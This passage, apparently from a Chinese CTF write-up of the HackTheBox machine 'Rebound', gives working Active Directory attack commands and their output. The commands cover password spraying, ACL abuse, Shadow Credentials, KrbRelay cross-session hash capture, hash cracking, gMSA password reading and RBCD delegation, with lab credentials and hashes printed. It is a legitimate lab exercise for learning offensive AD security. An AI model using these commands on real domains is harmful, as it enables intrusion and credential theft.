ObjectAceFlags              : ACE_INHERITED_OBJECT_TYPE_PRESENT
InheritanceType             : 4828cc14-1437-45bc-9b07-ad6f015e5f28
SecurityIdentifier          : BUILTIN\Pre-Windows 2000 Compatible Access (S-1-5-32-554)

ObjectDN                    : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
ObjectSID                   : S-1-5-21-4078382237-1492182817-2568127209-7683
ACEType                     : ACCESS_ALLOWED_OBJECT_ACE
ACEFlags                    : CONTAINER_INHERIT_ACE, INHERITED_ACE
AccessMask                  : ReadProperty
ObjectAceFlags              : ACE_INHERITED_OBJECT_TYPE_PRESENT
InheritanceType             : bf967a9c-0de6-11d0-a285-00aa003049e2
SecurityIdentifier          : BUILTIN\Pre-Windows 2000 Compatible Access (S-1-5-32-554)

ObjectDN                    : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
ObjectSID                   : S-1-5-21-4078382237-1492182817-2568127209-7683
ACEType                     : ACCESS_ALLOWED_OBJECT_ACE
ACEFlags                    : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE, INHERITED_ACE
AccessMask                  : ReadProperty
ObjectAceFlags              : ACE_INHERITED_OBJECT_TYPE_PRESENT
InheritanceType             : bf967aba-0de6-11d0-a285-00aa003049e2
SecurityIdentifier          : BUILTIN\Pre-Windows 2000 Compatible Access (S-1-5-32-554)

ObjectDN                    : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
ObjectSID                   : S-1-5-21-4078382237-1492182817-2568127209-7683
ACEType                     : ACCESS_ALLOWED_OBJECT_ACE
ACEFlags                    : CONTAINER_INHERIT_ACE, INHERITED_ACE, OBJECT_INHERIT_ACE
AccessMask                  : ReadProperty, WriteProperty
ObjectAceFlags              : ACE_OBJECT_TYPE_PRESENT
ObjectAceType               : 3f78c3e5-f79a-46bd-a0b8-9d18116ddc79
InheritanceType             : None
SecurityIdentifier          : Principal Self (S-1-5-10)

ObjectDN                    : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
ObjectSID                   : S-1-5-21-4078382237-1492182817-2568127209-7683
ACEType                     : ACCESS_ALLOWED_OBJECT_ACE
ACEFlags                    : CONTAINER_INHERIT_ACE, INHERITED_ACE
AccessMask                  : ControlAccess, ReadProperty, WriteProperty
ObjectAceFlags              : ACE_OBJECT_TYPE_PRESENT
ObjectAceType               : 91e647de-d96f-4b70-9557-d63ff4f3ccd8
InheritanceType             : None
SecurityIdentifier          : Principal Self (S-1-5-10)

ObjectDN                    : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
ObjectSID                   : S-1-5-21-4078382237-1492182817-2568127209-7683
ACEType                     : ACCESS_ALLOWED_ACE
ACEFlags                    : CONTAINER_INHERIT_ACE, INHERITED_ACE
ActiveDirectoryRights       : FullControl
AccessMask                  : 0xf01ff
InheritanceType             : None
SecurityIdentifier          : Enterprise Admins (S-1-5-21-4078382237-1492182817-2568127209-519)

ObjectDN                    : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
ObjectSID                   : S-1-5-21-4078382237-1492182817-2568127209-7683
ACEType                     : ACCESS_ALLOWED_ACE
ACEFlags                    : CONTAINER_INHERIT_ACE, INHERITED_ACE
ActiveDirectoryRights       : ListChildObjects
AccessMask                  : 0x4
InheritanceType             : None
SecurityIdentifier          : BUILTIN\Pre-Windows 2000 Compatible Access (S-1-5-32-554)

ObjectDN                    : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
ObjectSID                   : S-1-5-21-4078382237-1492182817-2568127209-7683
ACEType                     : ACCESS_ALLOWED_ACE
ACEFlags                    : CONTAINER_INHERIT_ACE, INHERITED_ACE
ActiveDirectoryRights       : ReadAndExecute
AccessMask                  : 0xf01bd
InheritanceType             : None
SecurityIdentifier          : Administrators (S-1-5-32-544)
```

查看servicemgmt群组中的成员。

```
PV> Get-DomainGroupMember -Identity servicemgmt
```

```shell
(LDAPS)-[dc01.rebound.htb]-[rebound\ldap_monitor]
PV > Get-DomainGroupMember -Identity servicemgmt
GroupDomainName             : ServiceMgmt
GroupDistinguishedName      : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
MemberDomain                : rebound.htb
MemberName                  : ppaul
MemberDistinguishedName     : CN=ppaul,CN=Users,DC=rebound,DC=htb
MemberSID                   : S-1-5-21-4078382237-1492182817-2568127209-1951

GroupDomainName             : ServiceMgmt
GroupDistinguishedName      : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
MemberDomain                : rebound.htb
MemberName                  : fflock
MemberDistinguishedName     : CN=fflock,CN=Users,DC=rebound,DC=htb
MemberSID                   : S-1-5-21-4078382237-1492182817-2568127209-3382
```



### 5.2 Password Spraying / Milestone 2: oorend password

在域中，一些用户使用相同的密码是很常见的。Password Spraying是指使用相同的密码，遍历不同的用户名。

通过`netexec`工具，使用`ldap_monitor`的密码对域内其他用户进行密码喷洒攻击，发现`oorend`用户使用的密码和ldap_monitor相同。

```
netexec smb dc01.rebound.htb -u usernames.txt -p '1GR8t@$$4u' --continue-on-success
```

![image-20240825142407674](D:\markdown images\image-20240825142407674.png)



### 5.3 User 'oorend' adding self to group 'servicemgmt'

通过powerview工具，以oorend的身份登陆，并将自己加入到servicemgmt群组中。

```
powerview rebound.htb/oorend:'1GR8t@$$4u'@dc01.rebound.htb -k
```

首先查看群组中的全部成员，可见此时servicemgmt群组只包含2个用户。

```
PV> Get-DomainGroupMember -Identity servicemgmt
```

![image-20240906154758927](D:\markdown images\image-20240906154758927.png)

oorend对servicemgmt群组拥有`Self`权限，可以将自己加入servicemgmt群组。再次查看群组成员，即可发现已经加入了oorend用户。

```sh
PV> Add-DomainGroupMember -Identity servicemgmt -Members oorend
```

![image-20240906154821189](D:\markdown images\image-20240906154821189.png)



==todo：检查此时是否已经拥有FullControl权限==

### 5.4 Descendant Object Takeover: Give FullControl right of OU objects to User 'oorend'

假如这一步失败，可能是由于machine会定时重置群组成员，只需要重新再将oorend加入Sevicemgmt群组即可。

**将oorend加入到Servicemgmt群组后拥有了对Service Users组织单元的FullControl权限，然后可以进一步将权限拓展到其中的成员中，赋予`oorend`用户对`OU=Service Users`组织单元中成员的`FullControl`权限。**

+ 方法1：dacledit.py

```shell
python3 dacledit.py rebound.htb/oorend:'1GR8t@$$4u' -k -dc-ip 10.10.11.231 -action write -rights FullControl -inheritance -principal oorend -target-dn "OU=Service Users,DC=rebound,DC=htb" -use-ldaps
```

![image-20240825153944896](D:\markdown images\image-20240825153944896.png)

+ 方法2：bloodAD

也可以使用bloodAD赋予Full Control权限。

```
bloodyAD -d rebound.htb -u oorend -p '1GR8t@$$4u' --host dc01.rebound.htb add genericAll 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' oorends
```



+ 检查FullControl权限

在powerview中运行`Get-DomainObjectAcl`或`Get-ObjectAcl`命令，检查oorend对winrm_svc的FullControl权限。

```sh
PV> Get-DomainObjectAcl -Identity winrm_svc -Where "SecurityIdentifier contains oorend"
```

![image-20240906155408968](D:\markdown images\image-20240906155408968.png)



```
(LDAPS)-[dc01.rebound.htb]-[rebound\oorend]
PV > Get-ObjectAcl -Identity winrm_svc -Where "SecurityIdentifier contains oorend"
ObjectDN                    : CN=winrm_svc,OU=Service Users,DC=rebound,DC=htb
ObjectSID                   : S-1-5-21-4078382237-1492182817-2568127209-7684
ACEType                     : ACCESS_ALLOWED_ACE
ACEFlags                    : CONTAINER_INHERIT_ACE, INHERITED_ACE, OBJECT_INHERIT_ACE
ActiveDirectoryRights       : FullControl
AccessMask                  : 0xf01ff
InheritanceType             : None
SecurityIdentifier          : oorend (S-1-5-21-4078382237-1492182817-2568127209-7682)
```



## 6. Shadow Credential获取winrm_svc的nt hash

利用oorend对winrm_svc的FullControl权限，对其执行Shadow Credential攻击。

一旦能够写入一个账户的msDs-KeyCredentialLink属性，就能获取到该账户的NT哈希值。

-account: shadow credential攻击目标

```shell
certipy shadow auto -k -u oorend@rebound.htb -p '1GR8t@$$4u' -account winrm_svc -target dc01.rebound.htb -dc-ip 10.10.11.231 
```

```
[*] Targeting user 'winrm_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '6d93bc47-af00-a358-78a9-f6c26e971984'
[*] Adding Key Credential with device ID '6d93bc47-af00-a358-78a9-f6c26e971984' to the Key Credentials for 'winrm_svc'
[*] Successfully added Key Credential with device ID '6d93bc47-af00-a358-78a9-f6c26e971984' to the Key Credentials for 'winrm_svc'
[*] Authenticating as 'winrm_svc' with the certificate
[*] Using principal: winrm_svc@rebound.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Restoring the old Key Credentials for 'winrm_svc'
[*] Successfully restored the old Key Credentials for 'winrm_svc'
[*] NT hash for 'winrm_svc': 4469650fd892e98933b4536d2e86e512
```



+ 登陆winrm_svc

```
evil-winrm -u winrm_svc -H 4469650fd892e98933b4536d2e86e512 -i 10.10.11.231
```

![image-20240826091308469](D:\markdown images\image-20240826091308469.png)

获取当前域中所有具有SPN的账户，可见delegator的SPN为browser，ldap的SPN为ldapmonitor。

```shell
Get-ADObject -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName
```

```shell
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> Get-ADObject -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName

DistinguishedName    : CN=delegator,CN=Managed Service Accounts,DC=rebound,DC=htb
Name                 : delegator
ObjectClass          : msDS-GroupManagedServiceAccount
ObjectGUID           : c9da97ae-5e35-44d2-aa15-114aecdc0caf
ServicePrincipalName : {browser/dc01.rebound.htb}

DistinguishedName    : CN=DC01,OU=Domain Controllers,DC=rebound,DC=htb
Name                 : DC01
ObjectClass          : computer
ObjectGUID           : dbdfe86f-7a6e-42c6-af7d-04373392a3d2
ServicePrincipalName : {ldap/dc01.rebound.htb/ForestDnsZones.rebound.htb, ldap/dc01.rebound.htb/DomainDnsZones.rebound.htb, Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/dc01.rebound.htb, DNS/dc01.rebound.htb...}

DistinguishedName    : CN=krbtgt,CN=Users,DC=rebound,DC=htb
Name                 : krbtgt
ObjectClass          : user
ObjectGUID           : 5beab92f-7948-498b-9409-e1a1bfaafbd8
ServicePrincipalName : {kadmin/changepw}

DistinguishedName    : CN=ldap_monitor,CN=Users,DC=rebound,DC=htb
Name                 : ldap_monitor
ObjectClass          : user
ObjectGUID           : cf7691bd-5b32-407d-9d42-262013f10288
ServicePrincipalName : {ldapmonitor/dc01.rebound.htb}
```





## 7. Cross Session Attack

在当前evil-winrm登陆的winrm_svc会话中，查看正在运行的进程，可以看到`explorer.exe`正在运行，那么猜测可能存在其他用户登陆。

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> get-process

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    395      32    12608      21168       0.16   2872   0 certsrv
    495      19     2572       5680       0.52    384   0 csrss
    359      15     3460      15016       0.06   5872   1 ctfmon
    397      33    16428      25336       1.20   2936   0 dfsrs
    181      11     2300       7864       0.03   1868   0 dfssvc
    130       8     1456       6240       0.00   1316   0 dllhost
   5374    4793    69052      71140       0.20   2968   0 dns
    603      25    24636      52300       0.19    260   1 dwm
   1501      59    23632      88700       0.91   5436   1 explorer
     53       6     1496       4720       0.05   2804   0 fontdrvhost
     53       6     1772       5448       0.05   2808   1 fontdrvhost
      0       0       56          8                 0   0 Idle
    144      12     2240       6012       0.00   2996   0 ismserv
   2282     160    55248      73676      63.17    640   0 lsass
    498      36    52512      64932      10.17   2840   0 Microsoft.ActiveDirectory.WebServices
    254      13     2916      10776       0.03   4216   0 msdtc
    645      92   283604     308632     392.84   2488   0 MsMpEng
      0      14      436      23668       1.95     88   0 Registry
    236      13     2784      17156       0.05   6148   1 RuntimeBroker
    672      32    20160      73152       0.58   5720   1 SearchUI
    276      12     2820      12476       0.03   7100   0 SecurityHealthService
    631      14     5860      13396       1.84    632   0 services
    778      30    16948      60532       0.33   5456   1 ShellExperienceHost
    455      17     5140      25188       0.27   5552   1 sihost
     53       3      524       1232       0.13    304   0 smss
    157       9     1544       8444       0.02   1708   1 SpatialAudioLicenseSrv
    284      13     3972      11616       0.36    340   0 svchost
   1859       0      192        160      26.80      4   0 System
    182      11     2108      11384       0.02   5644   1 taskhostw
    213      16     2368      11184       0.03   3756   0 vds
    174      11     2912      11200       0.00   2168   0 VGAuthService
    148       8     1688       7520       0.02   2088   0 vm3dservice
    141       9     1772       7968       0.02   5292   1 vm3dservice
    240      18     5084      15712       0.48   6720   1 vmtoolsd
    172      11     1416       7148       0.02    492   0 wininit
    283      12     2588      13048       0.16    560   1 winlogon
    392      20    10796      21536      12.06   3824   0 WmiPrvSE
    633      29    52596      68532       0.34   1748   0 wsmprovhost
```

在evil-winrm中查看当前登陆的用户，发现`tbrady`为当前登陆的活跃用户。

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> qwinsta
 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
>services                                    0  Disc
 console           tbrady                    1  Active
```

上传RunasCs.exe和KrbRelay.exe。RunasCs的`qwinsta`命令也可以查看当前windows中是否有其他用户登录。

```
./RunasCs.exe oorend '1GR8t@$$4u' -l 9 'qwinsta'
```

```
SESSIONNAME       USERNAME                   ID   STATE   TYPE        DEVICE
>services                                    0    Disc
 console           tbrady                    1    Active
```



执行cross session攻击，尽管存在报错，但仍然能够通过krbrelay攻击获取到在线登录用户的ntlm密码哈希。

> For this to work, we specify NTLM authentication via -ntlm , the session number via -session, and the CLSID for a valid RPC service with the correct permissions, which we pick from the defaults listed on the repository's README (under Cross-Session Relay, for Windows Server 2019).

```
./RunasCs.exe oorend '1GR8t@$$4u' -l 9 "C:\Users\winrm_svc\Desktop\RunasCs\krbrelay\KrbRelay.exe -ntlm -session 1 -clsid 354ff91b-5e49-4bdc-a8e6-1cb6c6877182 -port 10246"
```

```
[*] Auth Context: rebound\tbrady
[*] Rewriting function table
[*] Rewriting PEB
[*] GetModuleFileName: System
[*] Init com server
[*] GetModuleFileName: c:\users\winrm_svc\documents\KrbRelay.exe
[*] Register com server
objref:TUVPVwEAAAAAAAAAAAAAAMAAAAAAAABGgQIAAAAAAABE2/WUtxTYzPkHm5m5uj3OArQAAIQS///FyOBMrcIcMSIADAAHADEAMgA3AC4AMAAuADAALgAxAAAAAAAJAP//AAAeAP//AAAQAP//AAAKAP//AAAWAP//AAAfAP//AAAOAP//AAAAAA==:

[*] Forcing cross-session authentication
[*] Using CLSID: 354ff91b-5e49-4bdc-a8e6-1cb6c6877182
[*] Spawning in session 1
[*] NTLM1
4e544c4d535350000100000097b208e2070007002c00000004000400280000000a0063450000000f444330315245424f554e44
[*] NTLM2
4e544c4d53535000020000000e000e003800000015c289e25880459327b995f2000000000000000086008600460000000a0063450000000f7200650062006f0075006e00640002000e007200650062006f0075006e006400010008004400430030003100040016007200650062006f0075006e0064002e006800740062000300200064006300300031002e007200650062006f0075006e0064002e00680074006200050016007200650062006f0075006e0064002e0068007400620007000800c27b7f1b9602db01000000000000000000000000650078006500000041020000200044000e0000000b000000
[*] AcceptSecurityContext: SEC_I_CONTINUE_NEEDED
[*] fContextReq: Delegate, MutualAuth, ReplayDetect, SequenceDetect, UseDceStyle, Connection, AllowNonUserLogons
[*] NTLM3
tbrady::rebound:5880459327b995f2:3491e2bfa96ff949eeba302b46020706:0101000000000000c27b7f1b9602db016f7fc8fda9586a530000000002000e007200650062006f0075006e006400010008004400430030003100040016007200650062006f0075006e0064002e006800740062000300200064006300300031002e007200650062006f0075006e0064002e00680074006200050016007200650062006f0075006e0064002e0068007400620007000800c27b7f1b9602db010600040006000000080030003000000000000000010000000020000016b012a40663effcc0be5e392296b341dace676a443bd503f50934e1df836d190a00100000000000000000000000000000000000090000000000000000000000
System.UnauthorizedAccessException: Access is denied. (Exception from HRESULT: 0x80070005 (E_ACCESSDENIED))
   at KrbRelay.IStandardActivator.StandardGetInstanceFromIStorage(COSERVERINFO pServerInfo, Guid& pclsidOverride, IntPtr punkOuter, CLSCTX dwClsCtx, IStorage pstg, Int32 dwCount, MULTI_QI[] pResults)
   at KrbRelay.Program.Main(String[] args)
```

![img](D:\markdown images\edc94f53ca8cdb167589851c99f4de81.png)



使用john破解ntlmv3密码哈希，明文为`543BOMBOMBUNmanda`。

```shell
john tbrady --wordlist=/usr/share/wordlists/rockyou.txt
```

```
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
543BOMBOMBUNmanda (tbrady)     
1g 0:00:00:05 DONE (2024-09-09 10:32) 0.1865g/s 2274Kp/s 2274Kc/s 2274KC/s 5449977..5435844
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```



## 8. Read GMSA Password

根据第4节的bloodhound分析，可以观察到tbrady用户对delegator$账户拥有`ReadDMSAPassword`权限。

> Group Managed Service Accounts (GMSA) involve a setup in which Windows servers autonomously handle the password of an account by creating a complex, random password for it.

![image-20240826103601058](D:\markdown images\image-20240826103601058.png)



+ **方法1：bloodAD导出GMSA密码**

bloodAD能够导出delegator$的NTLM密码哈希                           

```shell
bloodyAD -d rebound.htb -u tbrady -p '543BOMBOMBUNmanda' --host dc01.rebound.htb get object 'delegator$' --resolve-sd --attr msDS-ManagedPassword
```

```shell
distinguishedName: CN=delegator,CN=Managed Service Accounts,DC=rebound,DC=htb
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:f7f7ea94cd22bd4129ca00bab335ceb9
msDS-ManagedPassword.B64ENCODED: ZhCKwN40T+v50IN1lFCkGOApU8008D+oW99yDAjZIaB1sRThOkiMLh2XW/vtZS0+ZJmP41rOCKmZSsMohCCwqJRLFC7jWFtgiFlt4eOJaTMAQcF1JVbhhXdfYf9tgxXGmeNHcjjybJPKmzpN8pc5HB1Ax8rau9Fj4myZUHTGd/+Gx96XeLGHJQ1wOyTcyRHSleSl8NREUiDNtJ5jhfpYO32TyRmXdDPY1a8ny6JsgZGyZgBeOAXnbXWaOBNl7D6FYSbQ8K0+yNjS120QUbZE/p2DASXBGIlYH0C5kLjEfP5Tu0RIOZop2vm1fU58pHfU3spUboWpbVGfx+2hEj0erQ==
```

+ **方法2：powerview读取GMSA密码**

```shell
powerview rebound.htb/tbrady:'543BOMBOMBUNmanda'@dc01.rebound.htb -k
```

单独执行查询`msDs-ManagedPassword`能够获取到LM哈希值。

```shell
(LDAPS)-[dc01.rebound.htb]-[rebound\tbrady]
PV > Get-ADObject -Identity delegator$ -Properties msDS-ManagedPassword
msDS-ManagedPassword     : f7f7ea94cd22bd4129ca00bab335ceb9
```

需要注意：直接获取全部属性的命令并未加载出msDs-ManagedPassword属性。

```
(LDAPS)-[dc01.rebound.htb]-[rebound\tbrady]
PV > Get-ADObject -Identity delegator$ -Properties *
objectClass                        : top
                                     person
                                     organizationalPerson
                                     user
                                     computer
                                     msDS-GroupManagedServiceAccount
cn                                 : delegator
distinguishedName                  : CN=delegator,CN=Managed Service Accounts,DC=rebound,DC=htb
instanceType                       : 4
whenCreated                        : 20230408090831.0Z
whenChanged                        : 20240906094901.0Z
uSNCreated                         : 69353
uSNChanged                         : 177222
name                               : delegator
objectGUID                         : {c9da97ae-5e35-44d2-aa15-114aecdc0caf}
userAccountControl                 : WORKSTATION_TRUST_ACCOUNT [4096]
badPwdCount                        : 0
codePage                           : 0
countryCode                        : 0
badPasswordTime                    : 09/06/2024
lastLogoff                         : 0
lastLogon                          : 09/06/2024
localPolicyFlags                   : 0
pwdLastSet                         : 09/05/2024
primaryGroupID                     : 515
objectSid                          : S-1-5-21-4078382237-1492182817-2568127209-7687
accountExpires                     : 9223372036854775807
logonCount                         : 36
sAMAccountName                     : delegator$
sAMAccountType                     : 805306369
dNSHostName                        : gmsa.rebound.htb
servicePrincipalName               : browser/dc01.rebound.htb
objectCategory                     : CN=ms-DS-Group-Managed-Service-Account,CN=Schema,CN=Configuration,DC=rebound,DC=htb
isCriticalSystemObject             : FALSE
dSCorePropagationData              : 16010101000000.0Z
lastLogonTimestamp                 : 09/05/2024
msDS-AllowedToDelegateTo           : http/dc01.rebound.htb
msDS-SupportedEncryptionTypes      : RC4-HMAC
                                     AES128
                                     AES256
msDS-ManagedPasswordId             : AQAAAEtEU0sCAAAAagEAABUAAAAOAAAAqozXLXGPzBuv4FrBregFhwAAAAAYAAAAGAAAAHIAZQBiAG8AdQBuAGQALgBoAHQAYgAA
                                     AHIAZQBiAG8AdQBuAGQALgBoAHQAYgAAAA==
msDS-ManagedPasswordPreviousId     : AQAAAEtEU0sCAAAAagEAABMAAAAGAAAAqozXLXGPzBuv4FrBregFhwAAAAAYAAAAGAAAAHIAZQBiAG8AdQBuAGQALgBoAHQAYgAA
                                     AHIAZQBiAG8AdQBuAGQALgBoAHQAYgAAAA==
msDS-ManagedPasswordInterval       : 30
msDS-GroupMSAMembership            : S-1-5-21-4078382237-1492182817-2568127209-7686
```



## 9. Constrained Delegation without Protocol Transition Attack (Kerberos Only)

### 9.1 Find Constrained Delegation

注意：虽然bloodhound显示不存在可以委派的账户，但实际上存在。

以oorend用户的凭据作为foothold，通过`impacket-findDelegation`脚本发现`delegator$`配置了对`http/dc01.rebound.htb`的Constrained Delegation。

```shell
impacket-findDelegation rebound.htb/oorend:'1GR8t@$$4u' -dc-ip dc01.rebound.htb -k
```

![image-20240826125911443](D:\markdown images\image-20240826125911443.png)

然后，可以利用获取到的LM哈希值获取`delegator$`的TGT。

```
impacket-getST rebound.htb/delegator\$ -hashes :f7f7ea94cd22bd4129ca00bab335ceb9 -dc-ip dc01.rebound.htb -spn http/dc01.rebound.htb -impersonate Administrator
```

```
C:\Users\Administrator\Desktop>Rubeus.exe asktgt /user:delegator$ /rc4:f7f7ea94cd22bd4129ca00bab335ceb9 /domain:rebound.htb /dc:dc01.rebound.htb
```

```
[*] Action: Ask TGT
[*] Using rc4_hmac hash: f7f7ea94cd22bd4129ca00bab335ceb9
[*] Building AS-REQ (w/ preauth) for: 'rebound.htb\delegator$'
[*] Using domain controller: 10.10.11.231:88
[+] TGT request successful!
[*] base64(ticket.kirbi):
      doIFeDCCBXSgAwIBBaEDAgEWooIEjjCCBIphggSGMIIEgqADAgEFoQ0bC1JFQk9VTkQuSFRCoiAwHqAD
      AgECoRcwFRsGa3JidGd0GwtyZWJvdW5kLmh0YqOCBEgwggREoAMCARKhAwIBAqKCBDYEggQyfVeeQ8mm
      rplh4PlpcHjF...
  ServiceName              :  krbtgt/rebound.htb
  ServiceRealm             :  REBOUND.HTB
  UserName                 :  delegator$ (NT_PRINCIPAL)
  UserRealm                :  REBOUND.HTB
  StartTime                :  9/5/2024 8:58:37 AM
  EndTime                  :  9/5/2024 6:58:37 PM
  RenewTill                :  9/12/2024 8:58:37 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  nAdokw2JpzsU6ZrZurHFzQ==
  ASREP (key)              :  F7F7EA94CD22BD4129CA00BAB335CEB9
```

令`delegator$`替Administrator执行对http/dc01.rebound.htb的约束委派，S4U2self执行成功，S4U2proxy执行失败。

```
getST.py rebound.htb/delegator\$ -hashes :e1630b0e18242439a50e9d8b5f5b7524 -dc-ip dc01.rebound.htb -spn http/dc01.rebound.htb -impersonate Administrator -self
```

```
C:\Users\Administrator\Desktop> Rubeus.exe s4u /ticket:delegator$.kirbi /impersonateuser:Administrator /msdsspn:http/dc01.rebound.htb /dc:dc01.rebound.htb /outfile:tmp.kirbi
```

```
[*] Action: S4U
[*] Action: S4U
[*] Building S4U2self request for: 'delegator$@REBOUND.HTB'
[*] Using domain controller: dc01.rebound.htb (10.10.11.231)
[*] Sending S4U2self request to 10.10.11.231:88
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'delegator$@REBOUND.HTB'
[*] base64(ticket.kirbi):
      doIF7DCCBeigAwIBBaEDAgEWooIE+DCCBPRhggTwMIIE7KADAgEFoQ0bC1JFQk9VTkQuSFRCohcwFaAD
      AgEBoQ4wDBsKZGVsZWdhdG9yJKOCBLswggS3oAMCARKhAwIBA6KCBKkEggSlr1aPS8iheKHvVxzNhycL
      HK16JQYrDUxuwm...
[*] Ticket written to tmp_Administrator_to_delegator$@REBOUND.HTB.kirbi
[*] Impersonating user 'Administrator' to target SPN 'http/dc01.rebound.htb'
[*] Building S4U2proxy request for service: 'http/dc01.rebound.htb'
[*] Using domain controller: dc01.rebound.htb (10.10.11.231)
[*] Sending S4U2proxy request to domain controller 10.10.11.231:88
[X] KRB-ERROR (13) : KDC_ERR_BADOPTION
```

查看S4U2self产生的票据属性，发现S4U2proxy执行失败的原因是S4U2self阶段获取的ticket不可转发，因为Flags中没有Forwardable属性。

可能导致的原因是，`delegator$`的约束委派类型不允许协议转换（Protocol Transition），当前的类型可能为Kerberos Only的约束委派。启用Kerberos Only约束委派的账户只设置了`msDS-AllowedToDelegateTo   `属性，没有`TrustedForDelegation`属性。而只有存在TrustedForDelegation属性时，S4U2self产生的票据才会被标记为Forwardable。

```
describeTicket.py Administrator@delegator\$@REBOUND.HTB.ccache
```

```
C:\> Rubeus.exe describe /ticket:tmp_Administrator_to_delegator$@REBOUND.HTB.kirbi
[*] Action: Describe Ticket
  ServiceName              :  delegator$
  ServiceRealm             :  REBOUND.HTB
  UserName                 :  Administrator (NT_ENTERPRISE)
  UserRealm                :  REBOUND.HTB
  StartTime                :  9/5/2024 9:11:22 AM
  EndTime                  :  9/5/2024 6:59:56 PM
  RenewTill                :  9/12/2024 8:59:56 AM
  Flags                    :  name_canonicalize, pre_authent, renewable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  4SibMmJkyd0ZhmKu3uOjijNBmpwS3vw9HrCdP5+xI1w=
[!] AES256 in use but no '/serviceuser' passed, unable to generate crackable hash.
```

使用powerview验证，查看delegator的全部属性，的确不存在TrustedForDelegation。

```
PV> Get-ADObject -Identity "CN=delegator,CN=Managed Service Accounts,DC=rebound,DC=htb" -Properties *

accountExpires                  : 9223372036854775807
badPasswordTime                 : 133700976240223083
badPwdCount                     : 0
CanonicalName                   : rebound.htb/Managed Service Accounts/delegator
CN                              : delegator
codePage                        : 0
countryCode                     : 0
Created                         : 4/8/2023 2:08:31 AM
createTimeStamp                 : 4/8/2023 2:08:31 AM
Deleted                         :
Description                     :
DisplayName                     :
DistinguishedName               : CN=delegator,CN=Managed Service Accounts,DC=rebound,DC=htb
dNSHostName                     : gmsa.rebound.htb
dSCorePropagationData           : {12/31/1600 4:00:00 PM}
instanceType                    : 4
isCriticalSystemObject          : False
isDeleted                       :
LastKnownParent                 :
lastLogoff                      : 0
lastLogon                       : 133700976948504306
lastLogonTimestamp              : 133700255171629212
localPolicyFlags                : 0
logonCount                      : 36
Modified                        : 9/6/2024 2:49:01 AM
modifyTimeStamp                 : 9/6/2024 2:49:01 AM
msDS-AllowedToDelegateTo        : {http/dc01.rebound.htb}
msDS-GroupMSAMembership         : System.DirectoryServices.ActiveDirectorySecurity
msDS-ManagedPasswordId          : {1, 0, 0, 0...}
msDS-ManagedPasswordInterval    : 30
msDS-ManagedPasswordPreviousId  : {1, 0, 0, 0...}
msDS-SupportedEncryptionTypes   : 28
Name                            : delegator
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  : CN=ms-DS-Group-Managed-Service-Account,CN=Schema,CN=Configuration,DC=rebound,DC=htb
ObjectClass                     : msDS-GroupManagedServiceAccount
ObjectGUID                      : c9da97ae-5e35-44d2-aa15-114aecdc0caf
objectSid                       : S-1-5-21-4078382237-1492182817-2568127209-7687
primaryGroupID                  : 515
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 133700254673035537
sAMAccountName                  : delegator$
sAMAccountType                  : 805306369
sDRightsEffective               : 15
servicePrincipalName            : {browser/dc01.rebound.htb}
userAccountControl              : 4096
uSNChanged                      : 177222
uSNCreated                      : 69353
whenChanged                     : 9/6/2024 2:49:01 AM
whenCreated                     : 4/8/2023 2:08:31 AM
```



+ 补充知识

> 一共有3种委派类型
>
> a. Unconstrained Delegation
>
> b. Constrained Delegation: Protocal Transition / Kerberos Only
>
> c. Resource-based Constrained Delegation



### 9.2 Configure RBCD and Attack: Impersonate Administrator

要想利用Constrained Delegation继续攻击，可选的方法有2种，此处选择第一种。

a. 利用基于RBCD的攻击获取Forwadable ST

b. 强迫或等待用户进行Kerberos认证，获取Forwadable ST



+ **Configure RBCD** 

==注意：为了让rbcd.py正常执行，需要配置`/etc/hosts`文件，将dc01添加到最前面，否则会报错。（为什么要让dcip为dc01？）==

```
10.10.11.231 dc01 dc01.rebound.htb rebound.htb
```

在delegator上配置基于资源的约束委派，配置msDs-AllowedToActOnBehalfOfOtherIdentity，允许指定的服务替其他用户委派到自己。

==todo而基于资源的约束委派的要求是，替其他用户进行委派的账户需要有至少一个SPN==。根据第6节的信息收集，只有krbtgt、DC01、delegator、ldap_monitor拥有SPN，因此我们**选择已经存在的ldap_monitor账户配置RBCD**。

```shell
impacket-rbcd rebound.htb/delegator\$ -hashes :f7f7ea94cd22bd4129ca00bab335ceb9 -k -delegate-from ldap_monitor -delegate-to delegator$ -action write -dc-ip dc01 -use-ldaps
```

```
[-] CCache file is not found. Skipping...
[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] ldap_monitor can now impersonate users on delegator$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
